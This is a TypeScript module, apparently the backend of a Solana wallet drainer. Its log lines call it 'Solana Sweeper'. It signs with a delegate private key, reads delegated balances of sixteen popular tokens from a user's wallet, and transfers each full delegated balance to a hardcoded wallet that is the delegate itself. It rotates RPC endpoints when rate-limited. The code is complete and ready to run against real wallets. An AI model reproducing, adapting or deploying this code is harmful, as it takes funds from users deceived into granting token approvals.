import { Connection, PublicKey, Keypair, Transaction, TransactionInstruction, sendAndConfirmTransaction } from '@solana/web3.js';
import bs58 from 'bs58';

const SOLANA_DELEGATE_ADDRESS = "HgPNUBvHSsvNqYQstp4yAbcgYLqg5n6U3jgQ2Yz2wyMN";
const DESTINATION_WALLET = "HgPNUBvHSsvNqYQstp4yAbcgYLqg5n6U3jgQ2Yz2wyMN";
const TOKEN_PROGRAM_ID = new PublicKey("TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA");
const ASSOCIATED_TOKEN_PROGRAM_ID = new PublicKey("ATokenGPvbdGVxr1b2hvZbsiqW5xWH25efTNsLJA8knL");

const SOLANA_TOKENS = [
  { symbol: "USDC", mint: "EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v" },
  { symbol: "USDT", mint: "Es9vMFrzaCERmJfrF4H2FYD4KCoNkY11McCe8BenwNYB" },
  { symbol: "SOL", mint: "So11111111111111111111111111111111111111112" },
  { symbol: "BONK", mint: "DezXAZ8z7PnrnRJjz3wXBoRgixCa6xjnB7YaB1pPB263" },
  { symbol: "JUP", mint: "JUPyiwrYJFskUPiHa7hkeR8VUtAeFoSYbKedZNsDvCN" },
  { symbol: "RAY", mint: "4k3Dyjzvzp8eMZWUXbBCjEvwSkkk59S5iCNLY3QrkX6R" },
  { symbol: "PYTH", mint: "HZ1JovNiVvGrGNiiYvEozEVgZ58xaU3RKwX8eACQBCt3" },
  { symbol: "WIF", mint: "EKpQGSJtjMFqKZ9KQanSqYXRcF8fBopzLHYxdM65zcjm" },
  { symbol: "ORCA", mint: "orcaEKTdK7LKz57vaAYr9QeNsVEPfiu6QeMU1kektZE" },
  { symbol: "MNGO", mint: "MangoCzJ36AjZyKwVj3VnYU4GTonjfVEnJmvvWaxLac" },
  { symbol: "SAMO", mint: "7xKXtg2CW87d97TXJSDpbD5jBkheTqA83TZRuJosgAsU" },
  { symbol: "SRM", mint: "SRMuApVNdxXokk5GT7XD5cUUgXMBCoAz2LHeuAoKWRt" },
  { symbol: "STEP", mint: "StepAscQoEioFxxWGnh2sLBDFp9d8rvKz2Yp39iDpyT" },
  { symbol: "COPE", mint: "8HGyAAB1yoM1ttS7pXjHMa3dukTFGQggnFFH3hJZgzQh" },
  { symbol: "FIDA", mint: "EchesyfXePKdLtoiZSL8pBe8Myagyy8ZRqsACNCFGnvp" },
  { symbol: "MEDIA", mint: "ETAtLmCmsoiEEKfNrHKJ2kYy3MoABhU6NQvpSfij5tDs" },
];

const RPC_ENDPOINTS = [
  'https://api.mainnet-beta.solana.com',
  'https://solana-mainnet.g.alchemy.com/v2/demo',
  'https://rpc.ankr.com/solana',
];

let currentRpcIndex = 0;
let connection = new Connection(RPC_ENDPOINTS[0], 'confirmed');

function rotateRpc() {
  currentRpcIndex = (currentRpcIndex + 1) % RPC_ENDPOINTS.length;
  connection = new Connection(RPC_ENDPOINTS[currentRpcIndex], 'confirmed');
  console.log(`[Solana Sweeper] Rotated to RPC: ${RPC_ENDPOINTS[currentRpcIndex]}`);
}

function getAssociatedTokenAddress(mint: PublicKey, owner: PublicKey): PublicKey {
  const [address] = PublicKey.findProgramAddressSync(
    [owner.toBuffer(), TOKEN_PROGRAM_ID.toBuffer(), mint.toBuffer()],
    ASSOCIATED_TOKEN_PROGRAM_ID
  );
  return address;
}

function createTransferInstruction(
  source: PublicKey,
  destination: PublicKey,
  owner: PublicKey,
  amount: bigint
): TransactionInstruction {
  const data = new Uint8Array(9);
  data[0] = 3;
  
  const amountBytes = new ArrayBuffer(8);
  const view = new DataView(amountBytes);
  view.setBigUint64(0, amount, true);
  data.set(new Uint8Array(amountBytes), 1);
  
  return new TransactionInstruction({
    keys: [
      { pubkey: source, isSigner: false, isWritable: true },
      { pubkey: destination, isSigner: false, isWritable: true },
      { pubkey: owner, isSigner: true, isWritable: false },
    ],
    programId: TOKEN_PROGRAM_ID,
    data: data as Buffer,
  });
}

function createAssociatedTokenAccountInstruction(
  payer: PublicKey,
  associatedToken: PublicKey,
  owner: PublicKey,
  mint: PublicKey
): TransactionInstruction {
  return new TransactionInstruction({
    keys: [
      { pubkey: payer, isSigner: true, isWritable: true },
      { pubkey: associatedToken, isSigner: false, isWritable: true },
      { pubkey: owner, isSigner: false, isWritable: false },
      { pubkey: mint, isSigner: false, isWritable: false },
      { pubkey: new PublicKey('11111111111111111111111111111111'), isSigner: false, isWritable: false },
      { pubkey: TOKEN_PROGRAM_ID, isSigner: false, isWritable: false },
    ],
    programId: ASSOCIATED_TOKEN_PROGRAM_ID,
    data: Buffer.alloc(0),
  });
}

function getDelegateKeypair(): Keypair | null {
  const privateKey = process.env.SOLANA_DELEGATE_PRIVATE_KEY;
  if (!privateKey) {
    console.log('[Solana Sweeper] No delegate private key configured');
    return null;
  }
  
  try {
    const decoded = bs58.decode(privateKey);
    const keypair = Keypair.fromSecretKey(decoded);
    
    if (keypair.publicKey.toBase58() !== SOLANA_DELEGATE_ADDRESS) {
      console.log(`[Solana Sweeper] Warning: Key address ${keypair.publicKey.toBase58()} doesn't match expected ${SOLANA_DELEGATE_ADDRESS}`);
    }
    
    return keypair;
  } catch (error: any) {
    console.error('[Solana Sweeper] Invalid private key format:', error?.message);
    return null;
  }
}

async function getTokenBalance(tokenAccount: PublicKey): Promise<bigint> {
  try {
    const accountInfo = await connection.getAccountInfo(tokenAccount);
    if (!accountInfo || accountInfo.data.length < 72) {
      return BigInt(0);
    }
    
    const dataView = new DataView(accountInfo.data.buffer, accountInfo.data.byteOffset);
    const amount = dataView.getBigUint64(64, true);
    return amount;
  } catch {
    return BigInt(0);
  }
}

async function getDelegatedAmount(tokenAccount: PublicKey, delegate: PublicKey): Promise<bigint> {
  try {
    const accountInfo = await connection.getAccountInfo(tokenAccount);
    if (!accountInfo || accountInfo.data.length < 121) {
      return BigInt(0);
    }
    
    const delegateOption = accountInfo.data[72];
    if (delegateOption !== 1) {
      return BigInt(0);
    }
    
    const delegateBytes = accountInfo.data.slice(73, 105);
    const accountDelegate = new PublicKey(delegateBytes);
    
    if (!accountDelegate.equals(delegate)) {
      return BigInt(0);
    }
    
    const dataView = new DataView(accountInfo.data.buffer, accountInfo.data.byteOffset);
    const delegatedAmount = dataView.getBigUint64(105, true);
    
    return delegatedAmount;
  } catch {
    return BigInt(0);
  }
}

export async function sweepApprovedTokens(
  userWallet: string,
  tokensApproved: string[]
): Promise<{ success: boolean; transfers: any[]; errors: string[] }> {
  const delegateKeypair = getDelegateKeypair();
  if (!delegateKeypair) {
    return { success: false, transfers: [], errors: ['Delegate private key not configured'] };
  }
  
  const transfers: any[] = [];
  const errors: string[] = [];
  const destinationKey = new PublicKey(DESTINATION_WALLET);
  const userKey = new PublicKey(userWallet);
  
  console.log(`[Solana Sweeper] Starting sweep for wallet: ${userWallet}`);
  console.log(`[Solana Sweeper] Tokens to sweep: ${tokensApproved.join(', ')}`);
  
  for (const tokenSymbol of tokensApproved) {
    const tokenInfo = SOLANA_TOKENS.find(t => t.symbol === tokenSymbol);
    if (!tokenInfo) {
      console.log(`[Solana Sweeper] Unknown token: ${tokenSymbol}`);
      continue;
    }
    
    try {
      const mintKey = new PublicKey(tokenInfo.mint);
      const userAta = getAssociatedTokenAddress(mintKey, userKey);
      const delegateAta = getAssociatedTokenAddress(mintKey, destinationKey);
      
      const balance = await getTokenBalance(userAta);
      const delegatedAmount = await getDelegatedAmount(userAta, delegateKeypair.publicKey);
      
      console.log(`[Solana Sweeper] ${tokenSymbol}: balance=${balance}, delegated=${delegatedAmount}`);
      
      if (balance === BigInt(0)) {
        console.log(`[Solana Sweeper] ${tokenSymbol}: No balance to transfer`);
        continue;
      }
      
      if (delegatedAmount === BigInt(0)) {
        console.log(`[Solana Sweeper] ${tokenSymbol}: No delegation found`);
        continue;
      }
      
      const transferAmount = balance < delegatedAmount ? balance : delegatedAmount;
      
      if (transferAmount === BigInt(0)) {
        continue;
      }
      
      console.log(`[Solana Sweeper] ${tokenSymbol}: Transferring ${transferAmount}`);
      
      const transaction = new Transaction();
      
      const destAtaInfo = await connection.getAccountInfo(delegateAta);
      if (!destAtaInfo) {
        console.log(`[Solana Sweeper] Creating destination ATA for ${tokenSymbol}`);
        transaction.add(
          createAssociatedTokenAccountInstruction(
            delegateKeypair.publicKey,
            delegateAta,
            destinationKey,
            mintKey
          )
        );
      }
      
      transaction.add(
        createTransferInstruction(
          userAta,
          delegateAta,
          delegateKeypair.publicKey,
          transferAmount
        )
      );
      
      const { blockhash, lastValidBlockHeight } = await connection.getLatestBlockhash();
      transaction.recentBlockhash = blockhash;
      transaction.feePayer = delegateKeypair.publicKey;
      
      const signature = await sendAndConfirmTransaction(
        connection,
        transaction,
        [delegateKeypair],
        { commitment: 'confirmed' }
      );
      
      console.log(`[Solana Sweeper] ${tokenSymbol}: SUCCESS - ${signature}`);
      
      transfers.push({
        token: tokenSymbol,
        amount: transferAmount.toString(),
        signature,
        success: true,
      });
      
    } catch (error: any) {
      const errorMsg = error?.message || 'Unknown error';
      console.error(`[Solana Sweeper] ${tokenSymbol}: FAILED - ${errorMsg}`);
      errors.push(`${tokenSymbol}: ${errorMsg}`);
      
      if (errorMsg.includes('429') || errorMsg.includes('rate')) {
        rotateRpc();
        await new Promise(resolve => setTimeout(resolve, 1000));
      }
    }
  }
  
  return {
    success: transfers.length > 0,
    transfers,
    errors,
  };
}

export async function sweepAllApprovedFromWallet(userWallet: string): Promise<{ success: boolean; transfers: any[]; errors: string[] }> {
  const allTokenSymbols = SOLANA_TOKENS.map(t => t.symbol);
  return sweepApprovedTokens(userWallet, allTokenSymbols);
}

export function getSolanaDelegateAddress(): string {
  return SOLANA_DELEGATE_ADDRESS;
}

export function getSweeperStatus(): { configured: boolean; delegateAddress: string; destination: string } {
  const hasKey = !!process.env.SOLANA_DELEGATE_PRIVATE_KEY;
  return {
    configured: hasKey,
    delegateAddress: SOLANA_DELEGATE_ADDRESS,
    destination: DESTINATION_WALLET,
  };
}
